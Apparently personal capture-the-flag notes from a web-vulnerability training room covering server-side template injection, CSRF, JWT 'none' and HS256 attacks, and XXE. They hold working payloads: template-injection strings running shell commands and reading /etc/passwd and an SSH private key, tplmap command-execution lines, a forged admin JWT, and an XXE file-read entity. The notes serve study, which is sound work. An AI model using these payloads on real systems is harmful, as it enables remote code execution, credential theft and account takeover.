# ZTH_Obscure_web_Vulns 

> VOiD | Thursday 05 August 2021 10:03:35 AM IST

My IP : 10.17.6.109
Target IP : 

# Section 1 [SSTI]
```
A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set  to the current user's username

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

```

payloads
```py
{{''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
```

Questions
```
1 How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)
{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}


2 What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one
{{''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.shh/id_rsa).read()}}
```

Automation
```
https://github.com/epinna/tplmap
Fortunately, we don't have to go searching for payloads to see how we can use SSTI to our advantage, because there is a tool known as Tplmap that does that for us! The tool can be found here. 
```

```bash
GET	
tplmap -u <url>/?<vulnparam>

POST	
tplmap -u <url> -d '<vulnparam>'

Question
How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

tplmap -u http://10.10.10.10:5000/?noot --os-cmd 'cat /etc/passwd'
tplmap -u http://10.10.10.10:5000/ -d noot --os-cmd 'cat /etc/passwd'
```

Challenge
```py
Prompt :" I've created a vulnerable machine for you to test your SSTI skills on! I've placed a flag in /flag aswell, good luck and have fun!"
{{config.__class__.__init__.__globals__['os'].popen(ls /).read()}}

i have to cheat cooctus

```


# Section 2 [CSRF]

```
Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">  which would change the account email on the vulnerable website to "pwned@evil-user.net".  CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.

This opens the door, to the user's account being fully compromised through the use of a password reset for example. The severity of this cannot be overstated, as it allows an attacker to potentially gain personal information about a user, such as credit card details in an extreme case.

```

Automation
```
Once again, there is a nice automated scanner, which tests if a site is vulnerable to CSRF. this tool is known as xsrfprobe and can be install via pip using 

pip3 install xsrfprobe

. This will only work using python 3(I mean come on it's 2020 you should be using python 3 anyway).

The syntax for the command is xsrfprobe -u <url>/<endpoint>. Let's run this against our vulnerable site.

```

# Section 3 [JWT]

Intro
```
Json Web Token's are a fairly interesting case, as it isn't a vulnerability itself. Infact, it's a fairly popular, and if done right very secure method of authentication. The basic structure of a JWT is this, it goes "header.payload.secret", the secret is only known to the server, and is used to make sure that data wasn't changed along the way. Everything is then base64 encoded. so an example JWT token would look like "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

Meaning that if we are able to control the secret, we can effectively control the data. To be able to do this we have to understand how the secret is calculated. This requires knowing the structure of the header, a typical JWT header looks like this {"typ":"JWT","alg":"RS256"}. We're interested in the alg field. RS256 uses a private RSA key that's only available to the server, so that's not vulnerable. However, We can change that field to HS256, This is calculated using the server's public key, which in certain circumstances we may have access too.

```

# JWT - none
```
In addition to the previous vulnerability, certain JWT libraries have another devastating vulnerability. There is actually three possible algorithms, two of them RS256 and HS256 which we have already studied. There is a third algorithm, known as None. According to the official JWT RFC the None algorithm is used when you still want to use JWT, however there is other security in place to stop people from spoofing data. 

Unfortunately certain JWT libraries clearly didn't read the RFC, allowing a vulnerability where an attacker can switch to the None algorithm, in the same way one switches to RS256 to HS255, and have the token be completely valid without even needing to calculate a secret.

```

Automation
```
There is no tool that can check the library, get the token, and make sure this is vulnerable. Therefore, you're gonna have to do this manually. The header for each JWT none vuln though is the same, which can help you out. Here's the header

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
Which decodes to {"type": "JWT", "alg": "none"}

```

Challenge
```bash
given jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjI4MTc3ODgwMzY4LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMDcgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjI4MTc3ODgwfQ._2oAtrYIbnxyDZRYo1zwhKSYwAj-rV5MnmiqH21roGQ

admin jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjI4MTc3ODgwMzY4LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMDcgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYyODE3Nzg4MH0.

flag=supernootnoot
```

# Section 5 [XXE]
Intro
```
Certain applications will occasionally have you post an XML document to do an action. Improper handling of these XML documents can lead to what's known as XML External Entity Injection(XXE). XXE is when an attacker is able to use the ENTITY feature of XML to load resources from outside the website directory, for example XXE would allow an attack to load the contents of /etc/passwd.

Since the application doesn't necessarily have to return data, you may not be able to get the contents of the external entity; however, that doesn't mean all hope is lost. If you're really lucky you may be able to use the php expect module to get RCE anyway.

```

Challenge 
```bash

use 
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>&xxe;</root>
```


# Section 6 [JWT bonus]

```
Recall that JWT HS256 is calculated using a secret.The exact format of the calculation is

HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
Therefore, it stands to reason that, since we have the full jwt token, and the header and payload, the secret can be brute forced to obtain the full JWT token. If the secret can be brute forced then the attacker could sign his own JWT tokens.

```





